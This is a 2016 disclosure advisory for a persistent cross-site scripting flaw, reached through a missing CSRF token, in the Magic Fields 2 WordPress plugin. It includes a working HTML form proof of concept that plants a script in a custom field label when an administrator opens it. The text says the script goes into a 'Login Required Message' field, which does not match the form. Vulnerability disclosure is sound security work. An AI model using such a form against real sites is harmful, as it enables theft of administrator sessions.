------------------------------------------------------------------------
Persistent Cross-Site Scripting in Magic Fields 2 WordPress Plugin
------------------------------------------------------------------------
Burak Kelebek, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A Cross-Site Scripting vulnerability was found in the Magic Fields 2
plugin. This issue allows an attacker to perform a wide variety of
actions, such as stealing Administrators' session tokens, or performing
arbitrary actions on their behalf. In order to exploit this issue, the
attacker has to lure/force a logged on WordPress Administrator into
opening a malicious website.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160724-0017

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully tested on Magic Fields 2 version 2.3.2.4.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
This issue is fixed in version 2.3.3

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_in_magic_fields_2_wordpress_plugin.html

The Magic Fields plugin lacks a CSRF (nonce) token on the request of adding a magic field. The magic field lacks output encoding which could result in malicious script inserted by an attacker.

You need to lure a logged-in admin to follow a malicious link containing the poc below.
Proof of concept

The proof of concept below injects script code in the "Login Required Message" in the settings page.

<html>
   <body>
      <form action="http://build.wordpress-develop.dev/wp-admin/admin.php?page=mf_dispatcher&init=true&mf_section=mf_custom_fields&mf_action=save_custom_field" method="POST">
         <input type="hidden" name="mf&#95;field&#91;core&#93;&#91;id&#93;" value="" />
         <input type="hidden" name="mf&#95;field&#91;core&#93;&#91;post&#95;type&#93;" value="page" />
         <input type="hidden" name="mf&#95;field&#91;core&#93;&#91;custom&#95;group&#95;id&#93;" value="" />
         <input type="hidden" name="mf&#95;field&#91;core&#93;&#91;label&#93;" value="foo&quot;&gt;&lt;script&gt;alert&#40;1&#41;&lt;&#47;script&gt;" />
         <input type="hidden" name="mf&#95;field&#91;core&#93;&#91;name&#93;" value="foo" />
         <input type="hidden" name="mf&#95;field&#91;core&#93;&#91;description&#93;" value="asdasdasd" />
         <input type="hidden" name="mf&#95;field&#91;core&#93;&#91;type&#93;" value="audio" />
         <input type="hidden" name="mf&#95;field&#91;core&#93;&#91;required&#95;field&#93;" value="0" />
         <input type="hidden" name="mf&#95;field&#91;core&#93;&#91;duplicate&#93;" value="0" />
         <input type="hidden" name="submit" value="Save&#32;Custom&#32;Field" />
         <input type="submit" value="Submit request" />
      </form>
   </body>
</html>

------------------------------------------------------------------------
Summer of Pwnage (https://sumofpwn.nl) is a Dutch community project. Its
goal is to contribute to the security of popular, widely used OSS
projects in a fun and educational way.
